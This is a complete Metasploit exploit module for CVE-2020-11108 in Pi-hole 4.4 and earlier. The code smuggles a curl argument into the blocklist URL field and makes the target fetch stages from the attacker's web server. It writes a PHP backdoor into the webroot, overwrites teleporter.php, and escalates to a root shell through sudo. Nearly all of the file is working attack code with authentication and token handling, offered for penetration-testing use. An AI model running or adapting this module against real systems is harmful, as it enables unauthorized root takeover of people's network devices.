##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039; => &#039;Pi-Hole heisenbergCompensator Blocklist OS Command Execution&#039;,
        &#039;Description&#039; => %q{
          This exploits a command execution in Pi-Hole <= 4.4.  A new blocklist is added, and then an
          update is forced (gravity) to pull in the blocklist content.  PHP content is then written
          to a file within the webroot.  Phase 1 writes a sudo pihole command to launch teleporter,
          effectively running a priv esc.  Phase 2 writes our payload to teleporter.php, overwriting,
          the content.  Lastly, the phase 1 PHP file is called in the web root, which launches
          our payload in teleporter.php with root privileges.
        },
        &#039;License&#039; => MSF_LICENSE,
        &#039;Author&#039; =>
          [
            &#039;h00die&#039;, # msf module
            &#039;Nick Frichette&#039; # original PoC, discovery
          ],
        &#039;References&#039; =>
          [
            [&#039;EDB&#039;, &#039;48443&#039;],
            [&#039;EDB&#039;, &#039;48442&#039;],
            [&#039;URL&#039;, &#039;https://frichetten.com/blog/cve-2020-11108-pihole-rce/&#039;],
            [&#039;URL&#039;, &#039;https://github.com/frichetten/CVE-2020-11108-PoC&#039;],
            [&#039;CVE&#039;, &#039;2020-11108&#039;]
          ],
        &#039;Platform&#039; => [&#039;php&#039;],
        &#039;Privileged&#039; => true,
        &#039;Arch&#039; => ARCH_PHP,
        &#039;Targets&#039; =>
          [
            [ &#039;Automatic Target&#039;, {}]
          ],
        &#039;DisclosureDate&#039; => &#039;May 10 2020&#039;,
        &#039;DefaultTarget&#039; => 0,
        &#039;Notes&#039; => {
          &#039;Stability&#039; => [CRASH_SAFE],
          &#039;SideEffects&#039; => [ARTIFACTS_ON_DISK, CONFIG_CHANGES],
          &#039;Reliability&#039; => [REPEATABLE_SESSION]
        }
      )
    )
    # set the default port, and a URI that a user can set if the app isn&#039;t installed to the root
    register_options(
      [
        Opt::RPORT(80),
        OptPort.new(&#039;SRVPORT&#039;, [true, &#039;Web Server Port, must be 80&#039;, 80]),
        OptString.new(&#039;PASSWORD&#039;, [ false, &#039;Password for Pi-Hole interface&#039;, &#039;&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The URI of the Pi-Hole Website&#039;, &#039;/&#039;])
      ]
    )
  end

  def setup
    super
    @stage = 0
  end

  def on_request_uri(cli, request)
    if request.method == &#039;GET&#039;
      vprint_status(&#039;Received GET request.  Responding&#039;)
      send_response(cli, rand_text_alphanumeric(5..10))
      return
    end

    case @stage
    when 0
      vprint_status(&#039;(1/2) Sending priv esc trigger&#039;)
      send_response(cli, %q{<?php shell_exec("sudo pihole -a -t") ?>})
      @stage += 1
    when 1
      vprint_status(&#039;(2/2) Sending root payload&#039;)
      send_response(cli, payload.encoded)
      @stage = 0
    else
      send_response(cli, rand_text_alphanumeric(5..10))
      vprint_status("Server received default request for #{request.uri}")
    end
  end

  def check
    begin
      res = send_request_cgi(
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;index.php&#039;),
        &#039;method&#039; => &#039;GET&#039;
      )
      fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
      fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") if res.code != 200

      # <b>Pi-hole Version <\/b> v4.3.2                                                            <b>
      # <b>Pi-hole Version </b> v4.3.2 <a class="alert-link lookatme" href="https://github.com/pi-hole/pi-hole/releases" target="_blank">(Update available!)</a>            <b>
      %r{<b>Pi-hole Version\s*</b>\s*v?(?<version>[\d\.]+).*<b>} =~ res.body

      if version && Gem::Version.new(version) <= Gem::Version.new(&#039;4.4&#039;)
        vprint_good("Version Detected: #{version}")
        return CheckCode::Appears
      else
        vprint_bad("Version Detected: #{version}")
        return CheckCode::Safe
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
    CheckCode::Safe
  end

  def add_blocklist(file, token, cookie)
    # according to the writeup, if you have a port, the colon gets messed up in the encoding.
    # also, looks like if you have a path (/file.php), it won&#039;t trigger either, or the / gets
    # messed with.
    data = {
      &#039;newuserlists&#039; => %(http://#{datastore[&#039;SRVHOST&#039;]}#" -o #{file} -d "),
      &#039;field&#039; => &#039;adlists&#039;,
      &#039;token&#039; => token,
      &#039;submit&#039; => &#039;saveupdate&#039;
    }

    send_request_cgi(
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;settings.php&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => cookie,
      &#039;vars_get&#039; => {
        &#039;tab&#039; => &#039;blocklists&#039;
      },
      &#039;data&#039; => data.to_query
    )
  end

  def update_gravity(cookie)
    vprint_status(&#039;Forcing gravity pull&#039;)
    send_request_cgi(
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;scripts&#039;, &#039;pi-hole&#039;, &#039;php&#039;, &#039;gravity.sh.php&#039;),
      &#039;cookie&#039; => cookie
    )
  end

  def execute_shell(backdoor_name, cookie)
    vprint_status(&#039;Popping root shell&#039;)
    send_request_cgi(
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;scripts&#039;, &#039;pi-hole&#039;, &#039;php&#039;, backdoor_name),
      &#039;cookie&#039; => cookie
    )
  end

  def login(cookie)
    vprint_status(&#039;Login required, attempting login.&#039;)
    send_request_cgi(
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;settings.php&#039;),
      &#039;cookie&#039; => cookie,
      &#039;vars_get&#039; => {
        &#039;tab&#039; => &#039;blocklists&#039;
      },
      &#039;vars_post&#039; => {
        &#039;pw&#039; => datastore[&#039;PASSWORD&#039;]
      },
      &#039;method&#039; => &#039;POST&#039;
    )
  end

  def exploit
    if check != CheckCode::Appears
      fail_with(Failure::NotVulnerable, &#039;Target is not vulnerable&#039;)
    end

    if datastore[&#039;SRVPORT&#039;] != 80
      fail_with(Failure::BadConfig, &#039;SRVPORT must be set to 80 for exploitation to be successful&#039;)
    end

    if datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;
      fail_with(Failure::BadConfig, &#039;SRVHOST must be set to an IP address (0.0.0.0 is invalid) for exploitation to be successful&#039;)
    end

    start_service({ &#039;Uri&#039; => {
      &#039;Proc&#039; => proc do |cli, req|
        on_request_uri(cli, req)
      end,
      &#039;Path&#039; => &#039;/&#039;
    } })

    begin
      # get cookie
      res = send_request_cgi(
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;index.php&#039;)
      )
      cookie = res.get_cookies
      print_status("Using cookie: #{cookie}")

      # get token
      res = send_request_cgi(
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;settings.php&#039;),
        &#039;cookie&#039; => cookie,
        &#039;vars_get&#039; => {
          &#039;tab&#039; => &#039;blocklists&#039;
        }
      )

      # check if we got hit by a login prompt
      if res && res.body.include?(&#039;Sign in to start your session&#039;)
        res = login(cookie)
      end

      if res && res.body.include?(&#039;Sign in to start your session&#039;)
        fail_with(Failure::BadConfig, &#039;Incorrect Password&#039;)
      end

      # <input type="hidden" name="token" value="t51q3YuxWT873Nn+6lCyMG4Lg840gRCgu03akuXcvTk=">
      # may also include /
      %r{name="token" value="(?<token>[\w+=/]+)">} =~ res.body

      unless token
        fail_with(Failure::UnexpectedReply, &#039;Unable to find token&#039;)
      end
      print_status("Using token: #{token}")

      # plant backdoor
      backdoor_name = "#{rand_text_alphanumeric 5..10}.php"
      register_file_for_cleanup backdoor_name
      print_status(&#039;Adding backdoor reference&#039;)
      add_blocklist(backdoor_name, token, cookie)

      # update gravity
      update_gravity(cookie)
      if @stage == 0
        print_status(&#039;Sending 2nd gravity update request.&#039;)
        update_gravity(cookie)
      end

      # plant root upgrade
      print_status(&#039;Adding root reference&#039;)
      add_blocklist(&#039;teleporter.php&#039;, token, cookie)

      # update gravity
      update_gravity(cookie)
      if @stage == 1
        print_status(&#039;Sending 2nd gravity update request.&#039;)
        update_gravity(cookie)
      end

      # pop shell
      execute_shell(backdoor_name, cookie)
      print_status("Blocklists must be removed manually from #{normalize_uri(target_uri.path, &#039;admin&#039;, &#039;settings.php&#039;)}?tab=blocklists")
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end

  end
end

